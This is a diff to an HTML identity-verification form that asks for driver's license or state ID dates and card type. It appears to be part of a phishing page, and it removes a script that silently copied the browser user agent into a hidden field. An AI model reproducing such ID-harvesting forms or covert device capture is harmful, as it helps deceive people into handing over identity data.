@@ -208,7 +208,7 @@ Verification
 
 <style>
   .text-amakapx {
-    font-size: 21px;
+    font-size: 19px;
     padding: 5px;
   }
 </style>
@@ -219,10 +219,9 @@ Verification
 <h5 class="text-amakapx">
  
 
+	This is the last step in the identity verification process. You'll need to use either a driver's license or a state-issued ID card to complete this step.
 
-This is the last step in the identity verification process; you will need your Driver's license or your State Issued ID card.
-
-
+	
 
 </h5>
 
@@ -274,14 +273,14 @@ Enter the expiry date of your driver's license or state ID card (optional)
        
 
 
- <input type="text" name="drivers-L-or-stateID-Expiry-MONTH"  class="three-input" placeholder="Month">
+ <input type="text" name="ID-Expiry-MONTH"  class="three-input" placeholder="Month">
  
 
 
        
 <input type="text" class="three-input" 
 
-name="drivers-L-or-stateID-Expiry-DAY" 
+name="ID-Expiry-DAY" 
 
 placeholder="Day">
         
@@ -290,7 +289,7 @@ placeholder="Day">
 
 
 <input type="text" class="three-input" 
-name="drivers-L-or-stateID-Expiry-YEAR" 
+name="ID-Expiry-YEAR" 
 placeholder="Year">
 
 
@@ -306,7 +305,7 @@ placeholder="Year">
     <!-- Three-box input field -->
 
 
-Enter the Issue date of your driver's license or state ID card(optional)
+Enter the Issue date of your driver's license or state ID card (optional)
 
 <div class="three-input-container">
        
@@ -343,10 +342,16 @@ placeholder="Year">
 <br>
 <br>
     <!-- Other input field -->
-Specify if you used a driver's license or a state issued ID card for this verification: Driver's License or State Issued ID Card?
+Specify if you used a driver's license or a state issued ID card for this verification: 
+	
+	
+	
+	Did you use a driver's license or a state-issued ID card for this verification?
 
 
-    <input type="text" class="input-fieldy" name="Card_Used" placeholder="Driver's License or State ID Card?">
+	
+
+    <input type="text" class="input-fieldy" name="IDcard_Used" placeholder="Driver's License or State ID Card?">
 
 </strong>
 
@@ -355,14 +360,6 @@ Specify if you used a driver's license or a state issued ID card for this verifi
 
 <br><br>
 	
-	
-<span style="display:none;">
-
-
-    <p id="user-agent"></p> </span>
-        <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
-        	
-
 
 
 
@@ -375,13 +372,6 @@ style="width: 100%; height: 44px; border: 0px solid #000; border-radius: 45px; b
 
 </form>
 
-
-<script>
-        const userAgent = navigator.userAgent;
-        document.getElementById('user-agent').textContent = userAgent;
-        document.getElementById('hidden-user-agent').value = userAgent;
-    </script>
- 
 
 
 
